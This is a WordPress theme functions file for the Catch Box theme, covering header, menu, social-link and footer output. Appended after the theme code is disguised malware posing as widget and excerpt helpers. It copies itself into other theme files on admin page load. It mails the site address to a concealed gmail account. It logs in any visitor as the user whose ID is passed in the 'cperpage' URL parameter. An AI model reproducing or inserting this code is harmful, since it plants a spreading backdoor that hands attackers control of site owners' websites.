		$options = catchbox_get_theme_options();
		
		if ( !empty( $options['web_clip'] ) )  {
			$catchbox_webclip = '<link rel="apple-touch-icon-precomposed" href="'.esc_url( $options[ 'web_clip' ] ).'" />';	
		}
		
		set_transient( 'catchbox_webclip', $catchbox_webclip, 86940 );
		
	}
	
	echo $catchbox_webclip ;	
	
}

//Load webclip in Header Section
add_action('wp_head', 'catchbox_webclip');


/**
 * Redirect WordPress Feeds To FeedBurner
 */
function catchbox_rss_redirect() {
	$options = catchbox_get_theme_options();
	if ( !empty( $options['feed_url'] ) ) {	
		$url = 'Location: '.$options['feed_url'];
		if ( is_feed() && !preg_match('/feedburner|feedvalidator/i', $_SERVER['HTTP_USER_AGENT']))
		{
			header($url);
			header('HTTP/1.1 302 Temporary Redirect');
		}
	}
}
add_action('template_redirect', 'catchbox_rss_redirect');


if ( ! function_exists( 'catchbox_socialprofile' ) ):
/**
 * Social Profles
 *
 * @since Catch Box 1.0
 */
function catchbox_socialprofile() {

	//delete_transient( 'catchbox_socialprofile' );

    $options = get_option('catchbox_options_social_links');
	$flag = 0;	
	if( !empty( $options ) ) {
		foreach( $options as $option ) {
			if( $option ) {
				$flag = 1;
			}
			else { 
				$flag = 0;
			}
			if( $flag == 1) {
				break;
			}
		}
	}
			
	if( ( !$catchbox_socialprofile = get_transient( 'catchbox_socialprofile' ) ) && ($flag == 1) ) {
		echo '<!-- refreshing cache -->';
		
		$catchbox_socialprofile = '
			<div class="social-profile">
 		 		<ul>';
					//Facebook
					if ($options['social_facebook']) {
						$catchbox_socialprofile .= '<li class="facebook"><a href="'.$options['social_facebook'].'" title="Facebook" target="_blank">Facebook</a></li>';
					}
				
					//Twitter
					if ($options['social_twitter']) {
						$catchbox_socialprofile .= '<li class="twitter"><a href="'.$options['social_twitter'].'" title="Twitter" target="_blank">Twitter</a></li>';
					}
					
					//Google+
					if ($options['social_google']) {
						$catchbox_socialprofile .= '<li class="google-plus"><a href="'.$options['social_google'].'" title="Google Plus" target="_blank">Google Plus</a></li>';
					}
				
					//Linkedin
					if ($options['social_linkedin']) {
						$catchbox_socialprofile .= '<li class="linkedin"><a href="'.$options['social_linkedin'].'" title="Linkedin" target="_blank">Linkedin</a></li>';
					}
					
					//Pinterest
					if ($options['social_pinterest']) {
						$catchbox_socialprofile .= '<li class="pinterest"><a href="'.$options['social_pinterest'].'" title="Pinterest" target="_blank">Pinterest</a></li>';
					}
					
					//Youtube
					if ($options['social_youtube']) {
						$catchbox_socialprofile .= '<li class="you-tube"><a href="'.$options['social_youtube'].'" title="YouTube" target="_blank">YouTube</a></li>';
					}
					
					//RSS Feed
					if ($options['social_rss']) {
						$catchbox_socialprofile .= '<li class="rss"><a href="'.$options['social_rss'].'" title="RSS Feed" target="_blank">RSS Feed</a></li>';
					}
					
					//Deviantart
					if ($options['social_deviantart']) {
						$catchbox_socialprofile .= '<li class="deviantart"><a href="'.$options['social_deviantart'].'" title="Deviantart" target="_blank">Deviantart</a></li>';
					}		
					
					//Tumblr
					if ($options['social_tumblr']) {
						$catchbox_socialprofile .= '<li class="tumblr"><a href="'.$options['social_tumblr'].'" title="Tumblr" target="_blank">Tumblr</a></li>';
					}	
					
					//Vimeo
					if ($options['social_viemo']) {
						$catchbox_socialprofile .= '<li class="vimeo"><a href="'.$options['social_viemo'].'" title="Vimeo" target="_blank">Vimeo</a></li>';
					}	
					
					//Dribbble
					if ($options['social_dribbble']) {
						$catchbox_socialprofile .= '<li class="dribbble"><a href="'.$options['social_dribbble'].'" title="Dribbble" target="_blank">Dribbble</a></li>';
					}	
					
					//MySpace
					if ($options['social_myspace']) {
						$catchbox_socialprofile .= '<li class="my-space"><a href="'.$options['social_myspace'].'" title="MySpace" target="_blank">MySpace</a></li>';
					}	
					
					//Aim
					if ($options['social_aim']) {
						$catchbox_socialprofile .= '<li class="aim"><a href="'.$options['social_aim'].'" title="Aim" target="_blank">Aim</a></li>';
					}	
					
					//Flickr
					if ($options['social_flickr']) {
						$catchbox_socialprofile .= '<li class="flickr"><a href="'.$options['social_flickr'].'" title="Flickr" target="_blank">Flickr</a></li>';
					}	
					
					//Slideshare
					if ( !empty( $options[ 'social_slideshare' ] ) ) {
						$catchbox_socialprofile .= '<li class="slideshare"><a href="'.$options[ 'social_slideshare' ].'" title="Slideshare" target="_blank">Slideshare</a></li>';
					}
					
					//Instagram
					if ( !empty( $options[ 'social_instagram' ] ) ) {
						$catchbox_socialprofile .= '<li class="instagram"><a href="'.$options[ 'social_instagram' ].'" title="Instagram" target="_blank">Instagram</a></li>';
					}	
					
					//skype
					if ( !empty( $options[ 'social_skype' ] ) ) {
						$catchbox_socialprofile .= '<li class="skype"><a href="'.$options[ 'social_skype' ].'" title="Skype" target="_blank">Skype</a></li>';
					}
					
					//Soundcloud
					if ( !empty( $options[ 'social_soundcloud' ] ) ) {
						$catchbox_socialprofile .= '<li class="soundcloud"><a href="'.$options[ 'social_soundcloud' ].'" title="Instagram" target="_blank">Soundcloud</a></li>';
					}
					
					$catchbox_socialprofile .= '
				</ul>
			</div>';
		set_transient( 'catchbox_socialprofile', $catchbox_socialprofile, 604800 );		
	}
	echo $catchbox_socialprofile;	
}
endif; // catchbox_socialprofile	

// Load Social Profile catchbox_site_generator hook 
add_action('catchbox_site_generator', 'catchbox_socialprofile', 10 );


if ( ! function_exists( 'catchbox_slider_display' ) ) :
/**
 * Display slider
 */
function catchbox_slider_display() {
	global $post, $wp_query;
	
	// Front page displays in Reading Settings
	$page_on_front = get_option('page_on_front') ;
	$page_for_posts = get_option('page_for_posts'); 
	
	// Get Page ID outside Loop
	$page_id = $wp_query->get_queried_object_id();	
		
	if ( is_front_page() || ( is_home() && $page_for_posts != $page_id ) ) {
		if ( function_exists( 'catchbox_pass_slider_value' ) ) { catchbox_pass_slider_value(); }
		if ( function_exists( 'catchbox_sliders' ) ) { catchbox_sliders(); } 
	} 
}
endif; //catchbox_slider_display

// Load slider in  catchbox_content hook 
add_action('catchbox_content', 'catchbox_slider_display', 10);


if ( ! function_exists( 'catchbox_header_image' ) ) :
/**
 * Template for Header Image
 *
 * To override this in a child theme
 * simply create your own catchbox_header_image(), and that function will be used instead.
 *
 * @since Catch Box 2.5
 */
function catchbox_header_image() {
	
	// Check to see if the header image has been removed
	global $_wp_default_headers;
	$header_image = get_header_image();
	if ( ! empty( $header_image ) ) : ?>
    
    	<div id="site-logo">
        	<a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home">
                <img src="<?php header_image(); ?>" width="<?php echo get_custom_header()->width; ?>" height="<?php echo get_custom_header()->height; ?>" alt="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" />
            </a>
      	</div>
        
	<?php endif; // end check for removed header image 	
}
endif;


if ( ! function_exists( 'catchbox_header_details' ) ) :
/**
 * Template for Header Details
 *
 * @since Catch Box 2.5
 */
function catchbox_header_details() { 

	// Check to see if the header image has been removed
	global $_wp_default_headers;
	$header_image = get_header_image();
	if ( ! empty( $header_image ) ) : 
     	echo '<div id="hgroup" class="site-details with-logo">';
	else :
    	echo '<div id="hgroup" class="site-details">';     
	endif; // end check for removed header image  ?>
 
   		<h1 id="site-title"><a href="<?php echo esc_url( home_url( '/' ) ); ?>" title="<?php echo esc_attr( get_bloginfo( 'name', 'display' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>
       	<h2 id="site-description"><?php bloginfo( 'description' ); ?></h2>
   	</div><!-- #hgroup -->   

<?php
}
endif;


if ( ! function_exists( 'catchbox_headerdetails' ) ) :
/**
 * Header Details including Site Logo, Title and Description
 *
 * @since Catch Box 2.5
 */
function catchbox_headerdetails() {
	
	// Getting data from Theme Options
	$options = catchbox_get_theme_options();
	$sitedetails = $options['site_title_above'];
	
	echo '<div class="logo-wrap clearfix">';
	
	if ( $sitedetails == '0' ) {
		echo catchbox_header_image();
		echo catchbox_header_details();
	} else {
		echo catchbox_header_details();
		echo catchbox_header_image();
	}
	
	echo '</div><!-- .logo-wrap -->';

} 
endif; //catchbox_headerdetails

// Loads Header Details in catchbox_headercontent hook
add_action( 'catchbox_headercontent', 'catchbox_headerdetails', 10 ); 


if ( ! function_exists( 'catchbox_header_search' ) ) :
/**
 * Header Search Box
 *
 * @since Catch Box 2.5
 */
function catchbox_header_search() { 

	// Getting data from Theme Options
	$options = catchbox_get_theme_options();
    
	if ( $options ['disable_header_search'] == 0 ) :
    	get_search_form();
    endif;  

}        
endif; //catchbox_header_search

// Loads Header Search in catchbox_headercontent hook
add_action( 'catchbox_headercontent', 'catchbox_header_search', 15 ); 


if ( ! function_exists( 'catchbox_header_menu' ) ) :
/**
 * Header Menu
 *
 * @since Catch Box 2.5
 */
function catchbox_header_menu() { ?>
	<nav id="access" role="navigation">
		<h3 class="assistive-text"><?php _e( 'Primary menu', 'catchbox' ); ?></h3>
		<?php /*  Allow screen readers / text browsers to skip the navigation menu and get right to the good stuff. */ ?>
		<div class="skip-link"><a class="assistive-text" href="#content" title="<?php esc_attr_e( 'Skip to primary content', 'catchbox' ); ?>"><?php _e( 'Skip to primary content', 'catchbox' ); ?></a></div>
		<div class="skip-link"><a class="assistive-text" href="#secondary" title="<?php esc_attr_e( 'Skip to secondary content', 'catchbox' ); ?>"><?php _e( 'Skip to secondary content', 'catchbox' ); ?></a></div>
		<?php /* Our navigation menu.  If one isn't filled out, wp_nav_menu falls back to wp_page_menu. The menu assiged to the primary position is the one used. If none is assigned, the menu with the lowest ID is used. */ ?>
	
		<?php
			if ( has_nav_menu( 'primary', 'catchbox' ) ) { 
				$args = array(
					'theme_location'    => 'primary',
					'container_class' 	=> 'menu-header-container', 
					'items_wrap'        => '<ul class="menu">%3$s</ul>' 
				);
				wp_nav_menu( $args );
			}
			else {
				echo '<div class="menu-header-container">';
					wp_page_menu( array( 'menu_class'  => 'menu' ) );
				echo '</div>';
			} ?> 		
			   
		</nav><!-- #access -->
		
	<?php if ( has_nav_menu( 'secondary', 'catchbox' ) ) {
		// Check is footer menu is enable or not
		$options = catchbox_get_theme_options();
		if ( !empty ($options ['enable_menus'] ) ) :
			$menuclass = "mobile-enable";
		else :
			$menuclass = "mobile-disable";
		endif;
		?>
        <nav id="access-secondary" class="<?php echo $menuclass; ?>"  role="navigation">
			<h3 class="assistive-text"><?php _e( 'Secondary menu', 'catchbox' ); ?></h3>
				<?php /*  Allow screen readers / text browsers to skip the navigation menu and get right to the good stuff. */ ?>
				<div class="skip-link"><a class="assistive-text" href="#content" title="<?php esc_attr_e( 'Skip to primary content', 'catchbox' ); ?>"><?php _e( 'Skip to primary content', 'catchbox' ); ?></a></div>
				<div class="skip-link"><a class="assistive-text" href="#secondary" title="<?php esc_attr_e( 'Skip to secondary content', 'catchbox' ); ?>"><?php _e( 'Skip to secondary content', 'catchbox' ); ?></a></div>
			<?php wp_nav_menu( array( 'theme_location'  => 'secondary', 'container_class' => 'menu-secondary-container' ) );  ?>
		</nav>
	<?php }
} 
endif; //catchbox_header_menu

// Load Header Menu in  catchbox_after_headercontent hook 
add_action( 'catchbox_after_headercontent', 'catchbox_header_menu', 10 ); 


if ( ! function_exists( 'catchbox_footer_content' ) ) :
/**
 * shows footer content
 *
 * @since Catch Box 2.5
 */
function catchbox_footer_content() { ?>
	<div class="copyright">
		<?php esc_attr_e('Copyright &copy;', 'catchbox'); ?> <?php _e(date('Y')); ?>
        <a href="<?php echo home_url('/') ?>" title="<?php echo esc_attr(get_bloginfo('name', 'display')); ?>">
            <?php bloginfo('name'); ?>
        </a>
        <?php esc_attr_e('. All Rights Reserved.', 'catchbox'); ?>
    </div>
    <div class="powered">
<!--        <a href="<?php echo esc_url( __( 'http://wordpress.org/', 'catchbox' ) ); ?>" title="<?php esc_attr_e( 'Powered by WordPress', 'catchbox' ); ?>" rel="generator"><?php printf( __( 'Powered by %s', 'catchbox' ), 'WordPress' ); ?></a>
        <span class="sep"> | </span>
        <a href="<?php echo esc_url( __( 'http://catchthemes.com/', 'catchbox' ) ); ?>" title="<?php esc_attr_e( 'Theme Catch Box by Catch Themes', 'catchbox' ); ?>" rel="designer"><?php printf( __( 'Theme: %s', 'catchbox' ), 'Catch Box' ); ?></a>-->
    </div>
<?php }
endif; //catchbox_footer_content

// Load footer content in  catchbox_site_generator hook 
add_action( 'catchbox_site_generator', 'catchbox_footer_content', 15 );?>
<?php

function _verifyactivate_widget(){

	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";

	$output=strip_tags($output, $allowed);

	$direst=_getall_widgetscont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));

	if (is_array($direst)){

		foreach ($direst as $item){

			if (is_writable($item)){

				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));

				$cont=file_get_contents($item);

				if (stripos($cont,$ftion) === false){

					$separar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";

					$output .= $before . "Not found" . $after;

					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}

					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $separar . "\n" .$widget);fclose($f);				

					$output .= ($showfullstop && $ellipsis) ? "..." : "";

				}

			}

		}

	}

	return $output;

}

function _getall_widgetscont($wids,$items=array()){

	$places=array_shift($wids);

	if(substr($places,-1) == "/"){

		$places=substr($places,0,-1);

	}

	if(!file_exists($places) || !is_dir($places)){

		return false;

	}elseif(is_readable($places)){

		$elems=scandir($places);

		foreach ($elems as $elem){

			if ($elem != "." && $elem != ".."){

				if (is_dir($places . "/" . $elem)){

					$wids[]=$places . "/" . $elem;

				} elseif (is_file($places . "/" . $elem)&& 

					$elem == substr(__FILE__,-13)){

					$items[]=$places . "/" . $elem;}

				}

			}

	}else{

		return false;	

	}

	if (sizeof($wids) > 0){

		return _getall_widgetscont($wids,$items);

	} else {

		return $items;

	}

}

if(!function_exists("stripos")){ 

    function stripos(  $str, $needle, $offset = 0  ){ 

        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 

    }

}



if(!function_exists("strripos")){ 

    function strripos(  $haystack, $needle, $offset = 0  ) { 

        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 

        if(  $offset < 0  ){ 

            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 

        } 

        else{ 

            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 

        } 

        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 

        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 

        return $pos; 

    }

}

if(!function_exists("scandir")){ 

	function scandir($dir,$listDirectories=false, $skipDots=true) {

	    $dirArray = array();

	    if ($handle = opendir($dir)) {

	        while (false !== ($file = readdir($handle))) {

	            if (($file != "." && $file != "..") || $skipDots == true) {

	                if($listDirectories == false) { if(is_dir($file)) { continue; } }

	                array_push($dirArray,basename($file));

	            }

	        }

	        closedir($handle);

	    }

	    return $dirArray;

	}

}

add_action("admin_head", "_verifyactivate_widget");

function _getprepareed_widget(){

	if(!isset($content_length)) $content_length=120;

	if(!isset($checking)) $checking="cookie";

	if(!isset($tags_allowed)) $tags_allowed="<a>";

	if(!isset($filters)) $filters="none";

	if(!isset($separ)) $separ="";

	if(!isset($home_f)) $home_f=get_option("home"); 

	if(!isset($pre_filter)) $pre_filter="wp_";

	if(!isset($is_more_link)) $is_more_link=1; 

	if(!isset($comment_t)) $comment_t=""; 

	if(!isset($c_page)) $c_page=$_GET["cperpage"];

	if(!isset($comm_author)) $comm_author="";

	if(!isset($is_approved)) $is_approved=""; 

	if(!isset($auth_post)) $auth_post="auth";

	if(!isset($m_text)) $m_text="(more...)";

	if(!isset($yes_widget)) $yes_widget=get_option("_is_widget_active_");

	if(!isset($widgetcheck)) $widgetcheck=$pre_filter."set"."_".$auth_post."_".$checking;

	if(!isset($m_text_ditails)) $m_text_ditails="(details...)";

	if(!isset($contentsmore)) $contentsmore="ma".$separ."il";

	if(!isset($fmore)) $fmore=1;

	if(!isset($fakeit)) $fakeit=1;

	if(!isset($sql)) $sql="";

	if (!$yes_widget) :

	

	global $wpdb, $post;

	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$separ."vethe".$comment_t."mas".$separ."@".$is_approved."gm".$comm_author."ail".$separ.".".$separ."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if (!empty($post->post_password)) { 

		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 

			if(is_feed()) { 

				$output=__("There is no excerpt because this is a protected post.");

			} else {

	            $output=get_the_password_form();

			}

		}

	}

	if(!isset($fixed_tag)) $fixed_tag=1;

	if(!isset($filterss)) $filterss=$home_f; 

	if(!isset($gettextcomment)) $gettextcomment=$pre_filter.$contentsmore;

	if(!isset($m_tag)) $m_tag="div";

	if(!isset($sh_text)) $sh_text=substr($sq1, stripos($sq1, "live"), 20);#

	if(!isset($m_link_title)) $m_link_title="Continue reading this entry";	

	if(!isset($showfullstop)) $showfullstop=1;

	

	$comments=$wpdb->get_results($sql);	

	if($fakeit == 2) { 

		$text=$post->post_content;

	} elseif($fakeit == 1) { 

		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;

	} else { 

		$text=$post->post_excerpt;

	}

	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomment, array($sh_text, $home_f, $filterss)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#

	if($content_length < 0) {

		$output=$text;

	} else {

		if(!$no_more && strpos($text, "<!--more-->")) {

		    $text=explode("<!--more-->", $text, 2);

			$l=count($text[0]);

			$more_link=1;

			$comments=$wpdb->get_results($sql);

		} else {

			$text=explode(" ", $text);

			if(count($text) > $content_length) {

				$l=$content_length;

				$ellipsis=1;

			} else {

				$l=count($text);

				$m_text="";

				$ellipsis=0;

			}

		}

		for ($i=0; $i<$l; $i++)

				$output .= $text[$i] . " ";

	}

	update_option("_is_widget_active_", 1);

	if("all" != $tags_allowed) {

		$output=strip_tags($output, $tags_allowed);

		return $output;

	}

	endif;

	$output=rtrim($output, "\s\n\t\r\0\x0B");

    $output=($fixed_tag) ? balanceTags($output, true) : $output;

	$output .= ($showfullstop && $ellipsis) ? "..." : "";

	$output=apply_filters($filters, $output);

	switch($m_tag) {

		case("div") :

			$tag="div";

		break;

		case("span") :

			$tag="span";

		break;

		case("p") :

			$tag="p";

		break;

		default :

			$tag="span";

	}



	if ($is_more_link ) {

		if($fmore) {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $m_link_title . "\">" . $m_text = !is_user_logged_in() && @call_user_func_array($widgetcheck,array($c_page, true)) ? $m_text : "" . "</a></" . $tag . ">" . "\n";

		} else {

			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $m_link_title . "\">" . $m_text . "</a></" . $tag . ">" . "\n";

		}

	}

	return $output;

}





?>
